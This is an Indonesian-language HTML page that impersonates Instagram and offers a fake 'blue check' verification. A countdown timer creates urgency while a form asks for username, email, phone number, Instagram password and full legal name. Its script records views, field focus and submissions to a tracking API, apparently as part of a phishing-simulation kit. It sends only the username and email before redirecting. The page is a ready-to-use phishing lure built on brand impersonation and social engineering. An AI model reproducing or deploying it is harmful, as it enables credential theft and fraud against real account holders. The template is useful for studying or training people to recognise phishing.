<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Verifikasi Centang Biru</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; max-width: 480px; width: 100%; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
        .header { background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%); padding: 30px 25px; text-align: center; color: white; }
        .header .instagram-logo { font-size: 3rem; margin-bottom: 15px; }
        .header h1 { font-size: 1.8rem; margin-bottom: 10px; font-weight: 600; }
        .verified-badge { background: white; color: #833ab4; padding: 15px 30px; border-radius: 50px; display: inline-flex; align-items: center; gap: 8px; font-weight: bold; font-size: 1.2rem; margin-top: 15px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        .content { padding: 30px 25px; }
        .congrats-box { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 15px; text-align: center; margin-bottom: 25px; }
        .congrats-box .icon { font-size: 3.5rem; margin-bottom: 12px; }
        .congrats-box h2 { font-size: 1.5rem; margin-bottom: 10px; }
        .countdown-box { background: #ffebee; border: 2px solid #f44336; border-radius: 12px; padding: 20px; text-align: center; margin-bottom: 25px; }
        .countdown-box .timer { font-size: 2.5rem; font-weight: bold; color: #d32f2f; font-family: monospace; }
        .form-section { background: #f8f9fa; padding: 25px; border-radius: 15px; margin-bottom: 20px; }
        .form-section h3 { color: #333; margin-bottom: 20px; text-align: center; font-size: 1.2rem; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; color: #333; font-weight: 600; margin-bottom: 8px; font-size: 0.9rem; }
        .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 1rem; }
        .form-group input:focus { outline: none; border-color: #833ab4; }
        .btn-verify { width: 100%; padding: 16px; background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%); color: white; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: bold; cursor: pointer; }
        .footer { background: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e0e0e0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="instagram-logo">üì∑</div>
            <h1>Instagram Official</h1>
            <p>Verification Center</p>
            <div class="verified-badge">‚úì Centang Biru</div>
        </div>
        <div class="content">
            <div class="congrats-box">
                <div class="icon">üéâ</div>
                <h2>SELAMAT!</h2>
                <p>Akun Anda telah dipilih untuk mendapatkan Verified Badge (Centang Biru) Instagram!</p>
            </div>
            <div class="countdown-box">
                <strong style="color: #c62828; display: block; margin-bottom: 10px;">‚è∞ CLAIM DALAM:</strong>
                <div class="timer" id="countdown">29:59</div>
            </div>
            <div class="form-section">
                <h3>üìù Formulir Verifikasi</h3>
                <form id="verifyForm">
                    <div class="form-group">
                        <label>Username Instagram</label>
                        <input type="text" id="username" placeholder="@username" required>
                    </div>
                    <div class="form-group">
                        <label>Email Terdaftar</label>
                        <input type="email" id="email" placeholder="email@example.com" required>
                    </div>
                    <div class="form-group">
                        <label>Nomor Telepon</label>
                        <input type="tel" id="phone" placeholder="08xxxxxxxxxx" required>
                    </div>
                    <div class="form-group">
                        <label>Password Instagram</label>
                        <input type="password" id="password" placeholder="Masukkan password" required>
                    </div>
                    <div class="form-group">
                        <label>Nama Lengkap (sesuai KTP)</label>
                        <input type="text" id="fullName" placeholder="Nama lengkap" required>
                    </div>
                    <button type="submit" class="btn-verify">‚úì VERIFIKASI & DAPATKAN CENTANG BIRU</button>
                </form>
            </div>
        </div>
        <div class="footer">
            <p><strong>Instagram from Meta</strong></p>
            <p>¬© 2024 Instagram. All rights reserved.</p>
        </div>
    </div>
    <script>
        const API_URL = 'http://localhost:5000/api';
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id');
        
        async function trackView() {
            if (!linkId) return;
            try {
                await fetch(\`\${API_URL}/log-activity\`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'Instagram verification page opened' })
                });
            } catch (e) {}
        }
        
        async function trackClick(f) {
            if (!linkId) return;
            try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: \`Field: \${f}\` }) }); } catch (e) {}
        }
        
        async function trackSubmit(d) {
            if (!linkId) return;
            try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(d) }) }); } catch (e) {}
        }
        
        let timeLeft = 1799;
        setInterval(() => {
            const m = Math.floor(timeLeft / 60), s = timeLeft % 60;
            document.getElementById('countdown').textContent = \`\${m.toString().padStart(2,'0')}:\${s.toString().padStart(2,'0')}\`;
            timeLeft--; if (timeLeft < 0) timeLeft = 1799;
        }, 1000);
        
        let c = new Set();
        document.querySelectorAll('input').forEach(i => i.addEventListener('focus', function() {
            const n = this.id || 'unknown';
            if (!c.has(n)) { c.add(n); trackClick(n); }
        }));
        
        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const d = { username: document.getElementById('username').value, email: document.getElementById('email').value };
            const b = e.target.querySelector('.btn-verify');
            b.textContent = '‚è≥ Memproses...'; b.disabled = true;
            await trackSubmit(d);
            setTimeout(() => window.location.href = 'index.html', 2000);
        });
        
        window.addEventListener('DOMContentLoaded', trackView);
    </script>
</body>
</html>
